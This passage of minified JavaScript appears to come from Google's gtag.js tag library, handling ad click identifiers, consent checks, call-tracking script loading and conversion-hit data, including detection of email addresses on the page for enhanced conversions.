              return encodeURIComponent(Y.brand || "") + ";" + encodeURIComponent(Y.version || "");
            }).join("|"));
            R("uam", Z.model);
            R("uap", Z.platform);
            R("uapv", Z.platformVersion);
            R("uaw", Z.wow64 ? "1" : "0");
          }
          var O = F + "/pagead/landing?" + C.join("&");
          $b(O);
        }
      }
      var c = !!a.Lf,
        d = !!a.Qe,
        e = a.yi,
        f = a.s,
        h = void 0 === a.oc ? {} : a.oc,
        l = void 0 === a.Je ? !0 : a.Je,
        m = Kk(),
        n = m.gclid || "",
        p = m.gclsrc,
        q = m.dclid || "",
        r = m.gbraid || "",
        t = !c && ((!n || p && "aw.ds" !== p ? !1 : !0) || r),
        u = Of();
      if (t || u) if (u) {
        var v = P(85) ? [K.g.F, K.g.K, K.g.fb] : [K.g.F];
        bg(function () {
          b();
          Q(v) || ag(function (w) {
            return b(!0, w.consentEventId, w.consentPriorityId);
          }, v);
        }, v);
      } else b();
    },
    $k = function (a) {
      var b = String(z.location).split(/[?#]/)[0],
        c = ze.Ki || z._CONSENT_MODE_SALT;
      return a ? c ? String(xi(b + a + c)) : "0" : "";
    },
    al = !1;
  var cl = /[A-Z]+/,
    dl = /\s/,
    el = function (a, b) {
      if (g(a)) {
        a = Ga(a);
        var c = a.indexOf("-");
        if (!(0 > c)) {
          var d = a.substring(0, c);
          if (cl.test(d)) {
            var e = a.substring(c + 1),
              f;
            if (b) {
              var h = function (n) {
                var p = n.indexOf("/");
                return 0 > p ? [n] : [n.substring(0, p), n.substring(p + 1)];
              };
              f = h(e);
              if ("DC" === d && 2 === f.length) {
                var l = h(f[1]);
                2 === l.length && (f[1] = l[0], f.push(l[1]));
              }
            } else {
              f = e.split("/");
              for (var m = 0; m < f.length; m++) if (!f[m] || dl.test(f[m]) && ("AW" !== d || 1 !== m)) return;
            }
            return {
              id: a,
              prefix: d,
              X: d + "-" + f[0],
              J: f
            };
          }
        }
      }
    },
    gl = function (a, b) {
      for (var c = {}, d = 0; d < a.length; ++d) {
        var e = el(a[d], b);
        e && (c[e.id] = e);
      }
      fl(c);
      var f = [];
      k(c, function (h, l) {
        f.push(l);
      });
      return f;
    };
  function fl(a) {
    var b = [],
      c;
    for (c in a) if (a.hasOwnProperty(c)) {
      var d = a[c];
      "AW" === d.prefix && d.J[1] && b.push(d.X);
    }
    for (var e = 0; e < b.length; ++e) delete a[b[e]];
  }
  ;
  var hl = function (a, b, c, d) {
    var e = Rb(),
      f;
    if (1 === e) a: {
      var h = Oe;
      h = h.toLowerCase();
      for (var l = "https://" + h, m = "http://" + h, n = 1, p = D.getElementsByTagName("script"), q = 0; q < p.length && 100 > q; q++) {
        var r = p[q].src;
        if (r) {
          r = r.toLowerCase();
          if (0 === r.indexOf(m)) {
            f = 3;
            break a;
          }
          1 === n && 0 === r.indexOf(l) && (n = 2);
        }
      }
      f = n;
    } else f = e;
    return (2 === f || d || "http:" != z.location.protocol ? a : b) + c;
  };
  var jl = function (a, b, c) {
      if (z[a.functionName]) return b.hg && G(b.hg), z[a.functionName];
      var d = il();
      z[a.functionName] = d;
      if (a.ze) for (var e = 0; e < a.ze.length; e++) z[a.ze[e]] = z[a.ze[e]] || il();
      a.Ie && void 0 === z[a.Ie] && (z[a.Ie] = c);
      Qb(hl("https://", "http://", a.pg), b.hg, b.pl);
      return d;
    },
    il = function () {
      var a = function () {
        a.q = a.q || [];
        a.q.push(arguments);
      };
      return a;
    },
    kl = {
      functionName: "_googWcmImpl",
      Ie: "_googWcmAk",
      pg: "www.gstatic.com/wcm/loader.js"
    },
    ll = {
      functionName: "_gaPhoneImpl",
      Ie: "ga_wpid",
      pg: "www.gstatic.com/gaphone/loader.js"
    },
    ml = {
      Hi: "",
      Vj: "5"
    },
    nl = {
      functionName: "_googCallTrackingImpl",
      ze: [ll.functionName, kl.functionName],
      pg: "www.gstatic.com/call-tracking/call-tracking_" + (ml.Hi || ml.Vj) + ".js"
    },
    ol = {},
    pl = function (a, b, c, d) {
      J(22);
      if (c) {
        d = d || {};
        var e = jl(kl, d, a),
          f = {
            ak: a,
            cl: b
          };
        void 0 === d.cb && (f.autoreplace = c);
        e(2, d.cb, f, c, 0, Ia(), d.options);
      }
    },
    ql = function (a, b, c, d) {
      J(21);
      if (b && c) {
        d = d || {};
        for (var e = {
            countryNameCode: c,
            destinationNumber: b,
            retrievalTime: Ia()
          }, f = 0; f < a.length; f++) {
          var h = a[f];
          ol[h.id] || (h && "AW" === h.prefix && !e.adData && 2 <= h.J.length ? (e.adData = {
            ak: h.J[0],
            cl: h.J[1]
          }, ol[h.id] = !0) : h && "UA" === h.prefix && !e.gaData && (e.gaData = {
            gaWpid: h.X
          }, ol[h.id] = !0));
        }
        (e.gaData || e.adData) && jl(nl, d)(d.cb, e, d.options);
      }
    },
    rl = function () {
      var a = !1;
      return a;
    },
    sl = function (a, b) {
      if (a) if (Vi()) {} else {
        if (g(a)) {
          var c = el(a);
          if (!c) return;
          a = c;
        }
        var d = void 0,
          e = !1,
          f = T(b, K.g.Bj);
        if (f && va(f)) {
          d = [];
          for (var h = 0; h < f.length; h++) {
            var l = el(f[h]);
            l && (d.push(l), (a.id === l.id || a.id === a.X && a.X === l.X) && (e = !0));
          }
        }
        if (!d || e) {
          var m = T(b, K.g.kh),
            n;
          if (m) {
            va(m) ? n = m : n = [m];
            var p = T(b, K.g.ih),
              q = T(b, K.g.jh),
              r = T(b, K.g.lh),
              t = T(b, K.g.Aj),
              u = p || q,
              v = 1;
            "UA" !== a.prefix || d || (v = 5);
            for (var w = 0; w < n.length; w++) if (w < v) if (d) ql(d, n[w], t, {
              cb: u,
              options: r
            });else if ("AW" === a.prefix && a.J[1]) rl() ? ql([a], n[w], t || "US", {
              cb: u,
              options: r
            }) : pl(a.J[0], a.J[1], n[w], {
              cb: u,
              options: r
            });else if ("UA" === a.prefix) if (rl()) ql([a], n[w], t || "US", {
              cb: u
            });else {
              var x = a.X,
                y = n[w],
                A = {
                  cb: u
                };
              J(23);
              if (y) {
                A = A || {};
                var B = jl(ll, A, x),
                  C = {};
                void 0 !== A.cb ? C.receiver = A.cb : C.replace = y;
                C.ga_wpid = x;
                C.destination = y;
                B(2, Ia(), C);
              }
            }
          }
        }
      }
    };
  var tl,
    ul = !1,
    vl = function (a) {
      if (!ul) {
        ul = !0;
        tl = tl || {};
      }
      return tl[a];
    };
  var wl = function (a, b, c) {
    this.target = a;
    this.eventName = b;
    this.s = c;
    this.h = {};
    this.metadata = H(c.eventMetadata || {});
    this.isAborted = !1;
  };
  wl.prototype.copyToHitData = function (a, b) {
    var c = T(this.s, a);
    void 0 !== c ? this.h[a] = c : void 0 !== b && (this.h[a] = b);
  };
  var xl = function (a, b, c) {
    var d = vl(a.target.X);
    return d && d.hasOwnProperty(b) ? d[b] : c;
  };
  function yl(a) {
    return {
      getDestinationId: function () {
        return a.target.X;
      },
      getEventName: function () {
        return a.eventName;
      },
      setEventName: function (b) {
        a.eventName = b;
      },
      getHitData: function (b) {
        return a.h[b];
      },
      setHitData: function (b, c) {
        a.h[b] = c;
      },
      setHitDataIfNotDefined: function (b, c) {
        void 0 === a.h[b] && (a.h[b] = c);
      },
      copyToHitData: function (b, c) {
        a.copyToHitData(b, c);
      },
      getMetadata: function (b) {
        return a.metadata[b];
      },
      setMetadata: function (b, c) {
        a.metadata[b] = c;
      },
      isAborted: function () {
        return a.isAborted;
      },
      abort: function () {
        a.isAborted = !0;
      },
      getFromEventContext: function (b) {
        return T(a.s, b);
      },
      xm: function () {
        return a;
      },
      getHitKeys: function () {
        return Object.keys(a.h);
      }
    };
  }
  ;
  var Al = function (a) {
      var b = zl[a.target.X];
      if (!a.isAborted && b) for (var c = yl(a), d = 0; d < b.length; ++d) {
        try {
          b[d](c);
        } catch (e) {
          a.isAborted = !0;
        }
        if (a.isAborted) break;
      }
    },
    zl = {};
  var Dl = function (a) {
      a = a || {};
      var b;
      if (!Of() || Q(Bl)) {
        (b = Cl(a)) || (b = Pi());
        var c = a,
          d = dk(c.prefix);
        fk(c, b);
        delete bk[d];
        delete ck[d];
        ek(d, c.path, c.domain);
        return Cl(a);
      }
    },
    Cl = function (a) {
      if (!Of() || Q(Bl)) {
        a = a || {};
        hk(a, !1);
        var b = ck[dk(Ik(a.prefix))];
        if (b && !(18E5 < Ja() - 1E3 * b.dg)) {
          var c = b.id,
            d = c.split(".");
          if (2 === d.length && !(864E5 < Ja() - 1E3 * (Number(d[1]) || 0))) return c;
        }
      }
    },
    Bl = K.g.F;
  var El = function (a, b, c) {
      var d = Ae.joined_auid = Ae.joined_auid || {},
        e = (c ? a || "_gcl" : "") + "." + b;
      if (d[e]) return !0;
      d[e] = !0;
      return !1;
    },
    Fl = function () {
      var a = uj(z.location.href).search.replace("?", "");
      return "1" === pj(a, "gad", !0);
    },
    Gl = function (a) {
      var b = [];
      k(a, function (c, d) {
        d = Hk(d);
        for (var e = [], f = 0; f < d.length; f++) e.push(d[f].R);
        e.length && b.push(c + ":" + e.join(","));
      });
      return b.join(";");
    },
    Hl = function (a, b, c) {
      if ("aw" === a || "dc" === a || "gb" === a) {
        var d = wj("gcl" + a);
        if (d) return d.split(".");
      }
      var e = !P(85) || Q(K.g.K),
        f = Ik(b);
      if ("_gcl" == f) {
        c = void 0 === c ? !0 : c;
        var h = !e || !Q(K.g.F) && c,
          l;
        l = Kk()[a] || [];
        if (0 < l.length) return h ? ["0"] : l;
      }
      if (!e) return [];
      var m = Nk(a, f);
      return m ? Ek(m) : [];
    },
    Il = function (a) {
      var b = P(85) ? [K.g.F, K.g.K] : [K.g.F];
      bg(function () {
        a();
        Q(b) || Tf(a, b);
      }, b);
    },
    Jl = /^(www\.)?google(\.com?)?(\.[a-z]{2}t?)?$/,
    Kl = /^www.googleadservices.com$/,
    Ll = function (a, b) {
      return Hl("aw", a, b);
    },
    Ml = function (a, b) {
      return Hl("dc", a, b);
    },
    Nl = function (a) {
      var b = !P(85) || Q(K.g.K),
        c = wj("gac");
      return c ? !b || !Q(K.g.F) && a ? "0" : decodeURIComponent(c) : b ? Gl(Bk() ? xk() : {}) : "";
    },
    Ol = function (a) {
      var b = !P(85) || Q(K.g.K),
        c = wj("gacgb");
      return c ? !b || !Q(K.g.F) && a ? "0" : decodeURIComponent(c) : b ? Gl(Bk() ? xk("_gac_gb", !0) : {}) : "";
    },
    Pl = function (a) {
      var b = Kk(),
        c = [],
        d = b.gclid,
        e = b.dclid,
        f = b.gclsrc || "aw",
        h = P(43) && Fl();
      !d || "aw.ds" !== f && "aw" !== f && "ds" !== f || c.push({
        R: d,
        vd: f
      });
      e && c.push({
        R: e,
        vd: "ds"
      });
      0 === c.length && b.gbraid && c.push({
        R: b.gbraid,
        vd: "gb"
      });
      P(35) && 0 === c.length && "aw.ds" === f && c.push({
        R: "",
        vd: "aw.ds"
      });
      Il(function () {
        if (P(85) && P(95) || Q(K.g.F)) {
          var l = !P(85) || Q(K.g.K);
          hk(a);
          var m;
          if (l && (m = bk[dk(a.prefix)], void 0 === m && !P(85))) return;
          var n = l ? c : [],
            p = [];
          m && p.push("auid=" + m);
          if (P(9)) {
            var q = D.referrer ? sj(uj(D.referrer), "host") : "";
            0 === n.length && (P(40) ? Jl.test(q) || Kl.test(q) : Jl.test(q)) && n.push({
              R: "",
              vd: ""
            });
            if (0 === n.length && !h) return;
            q && p.push("ref=" + encodeURIComponent(q));
            var r = 1 === Kh() ? z.top.location.href : z.location.href;
            r = r.replace(/[\?#].*$/, "");
            p.push("url=" + encodeURIComponent(r));
            p.push("tft=" + Ja());
            var t = cc();
            void 0 !== t && p.push("tfd=" + Math.round(t));
            if (P(34)) {
              var u = Kh();
              p.push("frm=" + u);
            }
            h && p.push("gad=1");
          }
          var v = Q(K.g.F) ? 'https://adservice.google.com/pagead/regclk' : "https://adservice.googlesyndication.com/pagead/regclk";
          if (0 < n.length) for (var w = 0; w < n.length; w++) {
            var x = n[w],
              y = x.R,
              A = x.vd;
            if (!El(a.prefix, A + "." + y, void 0 !== m)) {
              var B = v + "?" + p.join("&");
              "" !== y ? B = "gb" === A ? B + "&wbraid=" + y : B + "&gclid=" + y + "&gclsrc=" + A : "aw.ds" === A && (B += "&gclsrc=aw.ds");
              $b(B);
            }
          } else if (h && !El(a.prefix, "gad", void 0 !== m)) {
            var C = v + "?" + p.join("&");
            $b(C);
          }
        }
      });
    },
    Ql = function (a) {
      return wj("gclaw") || wj("gac") || 0 < (Kk().aw || []).length ? !1 : 0 < (Kk().gb || []).length ? !0 : Yk(a);
    };
  var Sl = function (a, b) {
      var c = a.ei,
        d = a.Ai;
      a.Th && (Zj(c[K.g.jc], !!c[K.g.O]) && (Pk(Rl, b), kk(b)), Mk(b), Sk(Rl, b), Pl(b));
      c[K.g.O] && (Rk(Rl, c[K.g.O], c[K.g.Ib], !!c[K.g.rb], b.prefix), lk(dk(b.prefix), c[K.g.O], c[K.g.Ib], !!c[K.g.rb], b), lk("FPAU", c[K.g.O], c[K.g.Ib], !!c[K.g.rb], b));
      d && Uk(Rl);
    },
    Tl = function (a, b, c, d) {
      var e = a.Di,
        f = a.callback,
        h = a.gi;
      if ("function" === typeof f) if (e === K.g.ib && void 0 === h) {
        var l = d(b.prefix, c);
        0 === l.length ? f(void 0) : 1 === l.length ? f(l[0]) : f(l);
      } else e === K.g.bc ? (J(65), hk(b, !1), f(bk[dk(b.prefix)])) : f(h);
    },
    Rl = ["aw", "dc", "gb"];
  function Ul(a) {
    var b = T(a.s, K.g.qb),
      c = T(a.s, K.g.pb);
    b && !c ? (a.eventName !== K.g.la && a.eventName !== K.g.Qd && J(131), a.isAborted = !0) : !b && c && (J(132), a.isAborted = !0);
  }
  ;
  var Vl = function () {
    var a = Jb && Jb.userAgent || "";
    if (0 > a.indexOf("Safari") || /Chrome|Coast|Opera|Edg|Silk|Android/.test(a)) return !1;
    var b = (/Version\/([\d\.]+)/.exec(a) || [])[1] || "";
    if ("" === b) return !1;
    for (var c = ["14", "1", "1"], d = b.split("."), e = 0; e < d.length; e++) {
      if (void 0 === c[e]) return !0;
      if (d[e] != c[e]) return Number(d[e]) > Number(c[e]);
    }
    return d.length >= c.length;
  };
  var Wl = function () {
      var a = z.screen;
      return {
        width: a ? a.width : 0,
        height: a ? a.height : 0
      };
    },
    Xl = function (a) {
      if (D.hidden) return !0;
      var b = a.getBoundingClientRect();
      if (b.top == b.bottom || b.left == b.right || !z.getComputedStyle) return !0;
      var c = z.getComputedStyle(a, null);
      if ("hidden" === c.visibility) return !0;
      for (var d = a, e = c; d;) {
        if ("none" === e.display) return !0;
        var f = e.opacity,
          h = e.filter;
        if (h) {
          var l = h.indexOf("opacity(");
          0 <= l && (h = h.substring(l + 8, h.indexOf(")", l)), "%" == h.charAt(h.length - 1) && (h = h.substring(0, h.length - 1)), f = Math.min(h, f));
        }
        if (void 0 !== f && 0 >= f) return !0;
        (d = d.parentElement) && (e = z.getComputedStyle(d, null));
      }
      return !1;
    };
  var gm = function (a, b, c) {
      var d = a.element,
        e = {
          P: a.P,
          type: a.ba,
          tagName: d.tagName
        };
      b && (e.querySelector = fm(d));
      c && (e.isVisible = !Xl(d));
      return e;
    },
    hm = function (a, b, c) {
      return gm({
        element: a.element,
        P: a.P,
        ba: "1"
      }, b, c);
    },
    im = function (a) {
      var b = !!a.Cd + "." + !!a.Dd;
      a && a.Ee && a.Ee.length && (b += "." + a.Ee.join("."));
      a && a.Za && (b += "." + a.Za.email + "." + a.Za.phone + "." + a.Za.address);
      return b;
    },
    lm = function (a) {
      if (0 != a.length) {
        var b;
        b = jm(a, function (c) {
          return !km.test(c.P);
        });
        b = jm(b, function (c) {
          return "INPUT" === c.element.tagName.toUpperCase();
        });
        b = jm(b, function (c) {
          return !Xl(c.element);
        });
        return b[0];
      }
    },
    mm = function (a, b) {
      if (!b || 0 === b.length) return a;
      for (var c = [], d = 0; d < a.length; d++) {
        for (var e = !0, f = 0; f < b.length; f++) {
          var h = b[f];
          if (h && Jd(a[d].element, h)) {
            e = !1;
            break;
          }
        }
        e && c.push(a[d]);
      }
      return c;
    },
    jm = function (a, b) {
      if (1 >= a.length) return a;
      var c = a.filter(b);
      return 0 == c.length ? a : c;
    },
    fm = function (a) {
      var b;
      if (a === D.body) b = "body";else {
        var c;
        if (a.id) c = "#" + a.id;else {
          var d;
          if (a.parentElement) {
            var e;
            a: {
              var f = a.parentElement;
              if (f) {
                for (var h = 0; h < f.childElementCount; h++) if (f.children[h] === a) {
                  e = h + 1;
                  break a;
                }
                e = -1;
              } else e = 1;
            }
            d = fm(a.parentElement) + ">:nth-child(" + e + ")";
          } else d = "";
          c = d;
        }
        b = c;
      }
      return b;
    },
    om = function (a) {
      for (var b = [], c = 0; c < a.length; c++) {
        var d = a[c],
          e = d.textContent;
        "INPUT" === d.tagName.toUpperCase() && d.value && (e = d.value);
        if (e) {
          var f = e.match(nm);
          if (f) {
            var h = f[0],
              l;
            if (z.location) {
              var m = rj(z.location, "host", !0);
              l = 0 <= h.toLowerCase().indexOf(m);
            } else l = !1;
            l || b.push({
              element: d,
              P: h
            });
          }
        }
      }
      return b;
    },
    sm = function () {
      var a = [],
        b = D.body;
      if (!b) return {
        elements: a,
        status: "4"
      };
      for (var c = b.querySelectorAll("*"), d = 0; d < c.length && 1E4 > d; d++) {
        var e = c[d];
        if (!(0 <= pm.indexOf(e.tagName.toUpperCase())) && e.children instanceof HTMLCollection) {
          for (var f = !1, h = 0; h < e.childElementCount && 1E4 > h; h++) if (!(0 <= qm.indexOf(e.children[h].tagName.toUpperCase()))) {
            f = !0;
            break;
          }
          (!f || P(55) && -1 !== rm.indexOf(e.tagName)) && a.push(e);
        }
      }
      return {
        elements: a,
        status: 1E4 < c.length ? "2" : "1"
      };
    },
    tm = !0,
    um = !1;
  var nm = /[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/i,
    vm = /@(gmail|googlemail)\./i,
    km = /support|noreply/i,
    pm = "SCRIPT STYLE IMG SVG PATH BR NOSCRIPT TEXTAREA".split(" "),
    qm = ["BR"],
    wm = {
      Zl: "1",
      km: "2",
      bm: "3",
      fm: "4",
      Wl: "5",
      lm: "6",
      gm: "7"
    },
    xm = {},
    rm = ["INPUT", "SELECT"];
  var Qm = function () {
      var a = {
        Cd: !0,
        Dd: !0,
        si: !0
      };
      a = a || {
        Cd: !0,
        Dd: !0
      };
      a.Za = a.Za || {
        email: !0,
        phone: !1,
        address: !1
      };
      var b = im(a),
        c = xm[b];
      if (c && 200 > Ja() - c.timestamp) return c.result;
      var d = sm(),
        e = d.status,
        f = [],
        h,
        l,
        m = [];
      if (!P(55)) {
        if (a.Za && a.Za.email) {
          var n = om(d.elements);
          f = mm(n, a && a.Ee);
          h = lm(f);
          10 < n.length && (e = "3");
        }
        !a.si && h && (f = [h]);
        for (var p = 0; p < f.length; p++) m.push(hm(f[p], a.Cd, a.Dd));
        m = m.slice(0, 10);
      } else if (a.Za) {}
      h && (l = hm(h, a.Cd, a.Dd));
      var C = {
        elements: m,
        xl: l,
        status: e
      };
      xm[b] = {
        timestamp: Ja(),
        result: C
      };
      return C;
    },
    Rm = function (a) {
      return a.tagName + ":" + a.isVisible + ":" + a.P.length + ":" + vm.test(a.P);
    };
  function Sm() {
    return "attribution-reporting";
  }
  function Tm(a) {
    var b;
    b = void 0 === b ? document : b;
    var c;
    return !(null == (c = b.featurePolicy) || !c.allowedFeatures().includes(a));
  }
  ;
  var Um = !1;
  function Vm() {
    if (Tm("join-ad-interest-group") && ta(Jb.joinAdInterestGroup)) return !0;
    Um || (Ih('AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9'), Um = !0);
    return Tm("join-ad-interest-group") && ta(Jb.joinAdInterestGroup);
  }
  function Wm(a, b) {
    var c = void 0;
    try {
      c = D.querySelector('iframe[data-tagging-id="' + b + '"]');
    } catch (e) {}
    if (c) {
      var d = Number(c.dataset.loadTime);
      if (d && 6E4 > Ja() - d) {
        ab("TAGGING", 9);
        return;
      }
    } else try {
      if (50 <= D.querySelectorAll('iframe[allow="join-ad-interest-group"][data-tagging-id*="-"]').length) {
        ab("TAGGING", 10);
        return;
      }
    } catch (e) {}
    Sb(a, void 0, {
      allow: "join-ad-interest-group"
    }, {
      taggingId: b,
      loadTime: Ja()
    }, c);
  }
  function Xm() {
    return "https://td.doubleclick.net";
  }
  ;
  var Ym = RegExp("^UA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*(?:%3BUA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*)*$"),
    Zm = /^~?[\w-]+(?:\.~?[\w-]+)*$/,
    $m = /^\d+\.fls\.doubleclick\.net$/,
    an = /;gac=([^;?]+)/,
    bn = /;gacgb=([^;?]+)/,
    cn = /;gclaw=([^;?]+)/,
    dn = /;gclgb=([^;?]+)/;
  function en(a, b) {
    if ($m.test(D.location.host)) {
      var c = D.location.href.match(b);
      return c && 2 == c.length && c[1].match(Ym) ? decodeURIComponent(c[1]) : "";
    }
    var d = [],
      e;
    for (e in a) {
      for (var f = [], h = a[e], l = 0; l < h.length; l++) f.push(h[l].R);
      d.push(e + ":" + f.join(","));
    }
    return 0 < d.length ? d.join(";") : "";
  }
  var fn = function (a, b, c) {
    var d = Bk() ? xk("_gac_gb", !0) : {},
      e = [],
      f = !1,
      h;
    for (h in d) {
      var l = Vk("_gac_gb_" + h, a, b, c);
      f = f || 0 !== l.length && l.some(function (m) {
        return 1 === m;
      });
      e.push(h + ":" + l.join(","));
    }
    return {
      yk: f ? e.join(";") : "",
      xk: en(d, bn)
    };
  };
  function gn(a, b, c) {
    if ($m.test(D.location.host)) {
      var d = D.location.href.match(c);
      if (d && 2 == d.length && d[1].match(Zm)) return [{
        R: d[1]
      }];
    } else return Dk((a || "_gcl") + b);
    return [];
  }
  var hn = function (a) {
      return gn(a, "_aw", cn).map(function (b) {
        return b.R;
      }).join(".");
    },
    jn = function (a) {
      return gn(a, "_gb", dn).map(function (b) {
        return b.R;
      }).join(".");
    },
    kn = function (a, b) {
      var c = Vk((b && b.prefix || "_gcl") + "_gb", a, b);
      return 0 === c.length || c.every(function (d) {
        return 0 === d;
      }) ? "" : c.join(".");
    };
  var ln = function () {
    if (ta(z.__uspapi)) {
      var a = "";
      try {
        z.__uspapi("getUSPData", 1, function (b, c) {
          if (c && b) {
            var d = b.uspString;
            d && RegExp("^[\\da-zA-Z-]{1,20}$").test(d) && (a = d);
          }
        });
      } catch (b) {}
      return a;
    }
  };
  var mn = function (a) {
      if (null != a) {
        var b = String(a).substring(0, 512),
          c = b.indexOf("#");
        return -1 == c ? b : b.substring(0, c);
      }
      return "";
    },
    nn = function () {
      var a = D.title;
      if (void 0 == a || "" == a) return "";
      var b = function (d) {
        try {
          return decodeURIComponent(d), !0;
        } catch (e) {
          return !1;
        }
      };
      a = encodeURIComponent(a);
      for (var c = 256; !b(a.substr(0, c));) c--;
      return decodeURIComponent(a.substr(0, c));
    },
    on = function (a) {
      a.metadata.speculative_in_message || (a.metadata.speculative = !1);
    },
    pn = function (a, b) {
      va(b) || (b = [b]);
      return 0 <= b.indexOf(a.metadata.hit_type);
    },
    qn = function (a) {
      var b = a.target.J[0];
      if (b) {
        a.h[K.g.Hc] = b;
        var c = a.target.J[1];
        c && (a.h[K.g.Wa] = c);
      } else a.isAborted = !0;
    },
    rn = function (a) {
      if (pn(a, ["conversion", "remarketing", "user_data_lead", "user_data_web"])) {
        var b = a.h[K.g.Wa],
          c = !0 === T(a.s, K.g.ff);
        c && (a.metadata.remarketing_only = !0);
        switch (a.metadata.hit_type) {
          case "conversion":
            !c && b && on(a);
            jf() && (a.metadata.is_gcp_conversion = !0);
            break;
          case "user_data_lead":
          case "user_data_web":
            !c && b && (a.isAborted = !0);
            break;
          case "remarketing":
            !c && b || on(a);
        }
        a.h[K.g.Bh] = a.metadata.is_gcp_conversion ? "www.google.com" : "www.googleadservices.com";
      }
    },
    sn = function (a) {
      pn(a, ["conversion", "remarketing"]);
    },
    tn = function (a) {
      if (pn(a, ["conversion", "remarketing"])) {
        var b = Kh();
        a.h[K.g.bh] = b;
        var c = T(a.s, K.g.oa);
        c || (c = 1 === b ? z.top.location.href : z.location.href);
        a.h[K.g.oa] = mn(c);
        a.copyToHitData(K.g.Aa, D.referrer);
        a.h[K.g.sb] = nn();
        a.copyToHitData(K.g.Da);
        var d = Wl();
        a.h[K.g.tb] = d.width + "x" + d.height;
        if (P(39)) {
          for (var e, f = z, h = f; f && f != f.parent;) f = f.parent, Gh(f) && (h = f);
          e = h;
          var l;
          var m = e.location.href;
          if (e === e.top) l = {
            url: m,
            Wk: !0
          };else {
            var n = !1,
              p = e.document;
            p && p.referrer && (m = p.referrer, e.parent === e.top && (n = !0));
            var q = e.location.ancestorOrigins;
            if (q) {
              var r = q[q.length - 1];
              r && -1 === m.indexOf(r) && (n = !1, m = r);
            }
            l = {
              url: m,
              Wk: n
            };
          }
          var t = l;
          t.url && c !== t.url && (a.h[K.g.xf] = mn(t.url));
        }
      }
    },
    un = function (a) {
      pn(a, ["conversion", "remarketing"]) && (a.copyToHitData(K.g.qa), a.copyToHitData(K.g.aa), a.copyToHitData(K.g.na), ("remarketing" === a.metadata.hit_type || P(76)) && a.copyToHitData(K.g.wa));
    },
    vn = function (a) {
      if (P(8)) if (!gj()) J(87);else if (void 0 !== ij) {
        J(85);
        var b = ej();
        b ? mj(b, a) : J(86);
      }
    },
    yn = function (a) {
      !pn(a, ["conversion"]) || P(85) && !Q(K.g.K) || (!0 === z._gtmpcm || Vl() ? a.h[K.g.Gb] = "2" : P(5) && (wn || Tm(Sm()) || (Ih('AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9'), wn = !0), xn || (xn = !0, Ih('A+xK4jmZTgh1KBVry/UZKUE3h6Dr9HPPioFS4KNCzify+KEoOii7z/goKS2zgbAOwhpZ1GZllpdz7XviivJM9gcAAACFeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiQXR0cmlidXRpb25SZXBvcnRpbmdDcm9zc0FwcFdlYiIsImV4cGlyeSI6MTcwNzI2Mzk5OSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ\x3d\x3d')), Tm(Sm()) && (a.h[K.g.Gb] = "1")));
    },
    zn = function (a) {
      pn(a, ["conversion", "remarketing"]) && P(6) && Q(K.g.F) && (!P(85) || Q(K.g.K)) && !1 !== T(a.s, K.g.Ba) && !1 !== T(a.s, K.g.Z) && !1 !== T(a.s, K.g.Fb) && !1 !== T(a.s, K.g.Ka) && Vm() && (a.h[K.g.Ng] = "1", a.metadata.send_fledge_experiment = !0);
    },
    An = function (a) {
      var b = function (d) {
        return T(a.s, d);
      };
      a.metadata.conversion_linker_enabled = !1 !== b(K.g.ya);
      var c = {
        prefix: b(K.g.Ia) || b(K.g.Ja),
        domain: b(K.g.Oa),
        yb: b(K.g.Ca),
        flags: b(K.g.Pa)
      };
      a.metadata.cookie_options = c;
      a.metadata.redact_ads_data = null != b(K.g.ma) && !1 !== b(K.g.ma);
      a.metadata.allow_ad_personalization = !1 !== b(K.g.Z);
    },
    Bn = function (a) {
      if (xl(a, "ccd_add_1p_data", !1) && Q(K.g.F)) {
        var b = a.s.B[K.g.qe];
        if (gf(b)) {
          var c = T(a.s, K.g.ra);
          null === c ? a.metadata.user_data_from_code = null : (b.enable_code && ic(c) && (a.metadata.user_data_from_code = c), ic(b.selectors) && (a.metadata.user_data_from_manual = ff(b.selectors)));
        }
      }
    },
    Cn = function (a) {
      var b = !a.metadata.send_user_data_hit && pn(a, ["conversion", "user_data_web"]),
        c = !xl(a, "ccd_add_1p_data", !1) && pn(a, "user_data_lead");
      if ((b || c) && Q(K.g.F)) {
        var d = "conversion" === a.metadata.hit_type,
          e = a.s,
          f = void 0,
          h = T(e, K.g.ra);
        if (d) {
          var l = (T(e, K.g.Zd) || {})[a.h[K.g.Wa]];
          if (!0 === T(e, K.g.Rd) || l) {
            var m;
            var n;
            if (l) b: {
              switch (l.enhanced_conversions_mode) {
                case "manual":
                  if (h && ic(h)) {
                    n = h;
                    break b;
                  }
                  var p = l.enhanced_conversions_manual_var;
                  n = void 0 !== p ? p : z.enhanced_conversion_data;
                  break b;
                case "automatic":
                  n = ff(l[K.g.Lg]);
                  break b;
              }
              n = void 0;
            } else n = z.enhanced_conversion_data;
            var q = n,
              r = (l || {}).enhanced_conversions_mode,
              t;
            if (q) {
              if ("manual" === r) switch (q._tag_mode) {
                case "CODE":
                  t = "c";
                  break;
                case "AUTO":
                  t = "a";
                  break;
                case "MANUAL":
                  t = "m";
                  break;
                default:
                  t = "c";
              } else t = "automatic" === r ? hf(l) ? "a" : "m" : "c";
              m = {
                P: q,
                Ci: t
              };
            } else m = {
              P: q,
              Ci: void 0
            };
            var u = m,
              v = u.Ci;
            f = u.P;
